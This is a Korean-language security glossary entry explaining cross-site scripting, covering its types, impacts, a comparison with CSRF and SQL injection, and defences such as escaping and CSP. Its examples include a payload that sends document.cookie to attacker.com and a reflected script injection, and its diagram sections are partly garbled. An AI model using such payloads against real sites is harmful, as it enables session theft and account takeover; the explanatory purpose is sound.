# XSS (Cross-Site Scripting)

## 📝 정의

XSS(Cross-Site Scripting)는 공격자가 악의적인 JavaScript 코드를 웹 애플리케이션에 삽입하여, 피해자가 웹 페이지를 방문할 때 해당 코드가 피해자의 브라우저에서 실행되게 하는 보안 취약점입니다. 이를 통해 공격자는 피해자의 쿠키, 세션, 개인 정보 등에 접근하거나 악의적인 행동을 수행할 수 있습니다.

XSS 공격은 입력 값을 제대로 검증하고 살균하지 않아서 발생하며, 가장 흔한 웹 보안 취약점 중 하나입니다. 공격자가 삽입한 스크립트는 웹 브라우저의 Same-Origin Policy를 우회하여 원래 웹사이트의 컨텍스트에서 실행되므로, 마치 정상적인 웹사이트 코드인 것처럼 작동합니다.

> **한 줄 요약**: XSS는 악의적인 스크립트를 웹 페이지에 삽입하여 사용자의 브라우저에서 실행시키는 공격

**비유 1**: XSS는 극장 무대에 몰래 혼입된 배우와 같습니다. 정상 배우처럼 보이지만, 예상하지 못한 대사와 행동(악의적인 스크립트)을 하여 관객(사용자)에게 해를 끼칩니다.

**비유 2**: XSS는 신뢰하는 음식에 몰래 든 독약과 같습니다. 겉으로는 정상 음식으로 보이지만, 섭취 시(페이지 로드 시) 독성 물질(악의적 코드)이 작용하여 피해를 입힙니다.

---

## 🎯 핵심 개념

### 1. Stored XSS (저장형)
악의적인 스크립트가 데이터베이스나 서버에 저장되어, 이후 다른 사용자가 해당 콘텐츠를 조회할 때마다 스크립트가 실행됩니다. 가장 위험한 형태의 XSS입니다.

### 2. Reflected XSS (반사형)
악의적인 스크립트가 URL 매개변수나 폼 데이터를 통해 전달되어, 해당 요청에 대한 응답 페이지에서만 스크립트가 실행됩니다. 보통 피싱 이메일에 포함된 악의적인 링크를 통해 전달됩니다.

### 3. DOM-Based XSS
클라이언트 측 JavaScript 코드가 사용자 입력을 부적절하게 처리하여, DOM(Document Object Model)을 직접 조작함으로써 발생하는 XSS입니다. 서버가 응답을 조작하지 않아도 발생할 수 있습니다.

### 4. 입력값 살균 및 이스케이프
사용자로부터 받은 입력값에 포함된 HTML, JavaScript 등의 특수 문자를 변환하여 스크립트로 해석되지 않도록 만드는 방어 기법입니다.

### 5. Content Security Policy (CSP)
웹 브라우저에 지시하여 외부 스크립트 로드, 인라인 스크립트 실행 등을 제한하는 HTTP 헤더 기반 보안 정책입니다.

---

## ⚠️ 해결하는 문제

### 문제 1: 쿠키 및 세션 탈취
공격자가 삽입한 스크립트는 `document.cookie`를 통해 사용자의 세션 쿠키, 인증 토큰 등을 열람하고 외부 서버로 전송하여, 사용자의 계정을 탈취할 수 있습니다.

### 문제 2: 개인 정보 유출
스크립트가 페이지의 DOM을 조작하여 사용자의 민감한 정보(신용카드 번호, 주소, 전화번호 등)를 열람하고 수집할 수 있습니다.

### 문제 3: 악의적인 리다이렉션
공격자의 스크립트가 사용자를 악성 웹사이트로 자동 리다이렉션하여 피싱 페이지에 접속하게 하거나, 악성 파일 다운로드를 유도할 수 있습니다.

### 문제 4: 사용자 행동 조작
스크립트가 마우스 클릭, 폼 제출 등 사용자의 행동을 감지하거나 조작하여, 사용자 의도와 무관한 거래, 메시지 발송, 계정 설정 변경 등을 강제할 수 있습니다.

---

## 🏗️ 구조

### Mermaid 1: Stored XSS 공격 흐름

```도해
흐름: XSS, 무슨 순서로 오가나
Attacker :: 악의적인 스크립트 포함 글 작성 <script>alert('…
웹사이트 :: 스크립트를 검증 없이 데이터베이스에 저장
Victim :: 게시판 방문
< 웹사이트 :: HTML 응답 (스크립트 포함)
< Victim :: 쿠키/세션 정보 전송
```

### Mermaid 2: XSS 유형별 공격 경로


### Mermaid 3: XSS 방어 계층

```도해
흐름: XSS, 어떤 순서로 이어지나
사용자 입력"] -->|검증|… :: 사용자 입력"] -->|검증|…
B :: 검증
C :: 이스케이프
D :: 저장
E :: 출력
F :: CSP 헤더
```

---

## ⚙️ 작동 원리

XSS 공격은 다음과 같은 단계로 진행됩니다:

1. **악성 스크립트 작성**: 공격자가 악의적인 JavaScript 코드를 작성합니다 (쿠키 탈취, 리다이렉션, 정보 수집 등).

2. **웹 애플리케이션에 삽입**: 공격자가 악성 스크립트를 댓글, 메시지, 폼 입력, URL 파라미터 등을 통해 웹 애플리케이션에 전달합니다.

3. **검증 부재**: 웹 애플리케이션이 입력값을 적절히 검증하거나 살균하지 않으면, 악성 스크립트가 그대로 저장되거나 응답에 포함됩니다.

4. **피해자 접근**: 피해자가 해당 웹 페이지에 접근하면, 브라우저는 HTML 응답을 파싱하고 포함된 악성 스크립트를 실행합니다.

5. **악의적 행동 수행**: 실행된 스크립트는 쿠키 탈취, 페이지 조작, 피싱 페이지로 리다이렉션, 악성 코드 다운로드 등의 악의적인 행동을 수행합니다.

---

## 📊 비교

| 항목 | XSS | CSRF | SQL Injection |
|------|-----|------|---------------|
| 공격 대상 | 클라이언트(브라우저) | 사용자 세션/권한 | 데이터베이스 |
| 공격 방식 | 악성 스크립트 실행 | 의도하지 않은 요청 전송 | 악성 SQL 삽입 |
| 데이터 접근 | 브라우저 메모리, 쿠키 | 세션을 통한 간접 조작 | 데이터베이스 직접 조작 |
| 검증 대상 | 입력값, 출력값 | 요청 출처, CSRF 토큰 | SQL 쿼리 파라미터 |
| 주요 방어 | 입력 검증, CSP | CSRF 토큰, SameSite 쿠키 | 파라미터 바인딩, ORM |
| 피해 범위 | 개인 정보, 계정 탈취 | 사용자 의도하지 않은 행동 | 전체 데이터베이스 손상 |
| 복잡도 | 상대적으로 쉬움 | 중간 | 고도의 기술 필요 |
| 발생 위치 | 프론트엔드 | 요청 전송 구간 | 백엔드 데이터베이스 |

---

## ✅ 장단점

### 공격 방식 관점

#### 장점 (공격자 입장)
- **진입 장벽 낮음**: 복잡한 기술이 아니어도 간단한 스크립트로 공격 가능
- **광범위한 피해**: Stored XSS는 모든 사용자에게 영향을 미칠 수 있음
- **검출 어려움**: 악성 스크립트가 정상 콘텐츠에 숨겨져 있어 감지하기 어려움
- **연쇄 공격 가능**: 탈취한 세션을 통해 추가 공격 수행 가능

### 방어 관점

#### 장점 (방어)
- **방어 기법 다양**: 입력 검증, 출력 이스케이프, CSP 등 다층 방어 가능
- **탐지 가능**: 비정상 스크립트 패턴을 모니터링하여 탐지 가능
- **개발 친화적**: 대부분의 웹 프레임워크가 내장 방어 기능 제공

#### 단점 (방어)
- **완전 방어 어려움**: 모든 입출력 지점을 완벽하게 보호하기 어려움
- **사용성과의 트레이드오프**: 과도한 필터링은 정상 콘텐츠도 차단할 수 있음
- **클라이언트 의존성**: 사용자의 브라우저 설정에 따라 방어 효과가 달라질 수 있음

---

## 💡 실제 사례

### 사례 1: SNS 게시판 악성 스크립트 삽입
게시판 댓글에 `<img src=x onerror="fetch('http://attacker.com?cookie=' + document.cookie)">` 코드를 삽입하면, 댓글을 보는 모든 사용자의 쿠키가 공격자 서버로 전송됩니다. 이를 통해 세션을 탈취하고 계정을 접근할 수 있습니다.

### 사례 2: 검색 결과 페이지 Reflected XSS
검색 기능이 사용자 입력을 검증하지 않고 바로 결과 페이지에 표시하는 경우, 공격자가 `?search=<script>alert('XSS')</script>` 형태의 링크를 만들어 피싱 이메일로 발송합니다. 링크를 클릭한 사용자의 브라우저에서 스크립트가 실행됩니다.

### 사례 3: 자동 로그인 페이지로 리다이렉션
악성 스크립트가 사용자를 가짜 로그인 페이지로 리다이렉션하여, 사용자가 자신의 인증 정보를 입력하도록 유도합니다. 피싱의 변형으로 XSS를 통해 신뢰성을 높입니다.

### 사례 4: 페이지 내용 조작
스크립트가 페이지의 결제 버튼, 금액, 계좌번호 등을 변조하여 사용자가 원치 않는 거래를 수행하도록 유도합니다. 예를 들어 송금액을 몰래 증가시키거나 계좌번호를 변경할 수 있습니다.

### 사례 5: 브라우저 플러그인 악용
악성 스크립트가 브라우저의 플러그인 API를 악용하여 사용자의 파일, 카메라, 마이크 등에 접근하거나, 설치된 애플리케이션 목록을 수집합니다.

---

## 🔗 관련 용어

- **CSRF (Cross-Site Request Forgery)**: XSS와 함께 발생하기 쉬운 웹 보안 취약점
- **SQL Injection**: 입력 검증 부재로 발생하는 데이터베이스 공격
- **Content Security Policy (CSP)**: XSS 방어를 위한 브라우저 보안 정책
- **입력 검증 (Input Validation)**: XSS 방어의 첫 번째 단계
- **출력 이스케이프 (Output Escaping)**: HTML 특수문자 변환
- **HTML Entity**: 특수문자를 안전한 형태로 표현하는 방식
- **DOM (Document Object Model)**: 브라우저가 HTML을 표현하는 구조
- **HTTPOnly 쿠키**: JavaScript 접근을 차단하는 쿠키 속성

---

*카테고리: 보안*
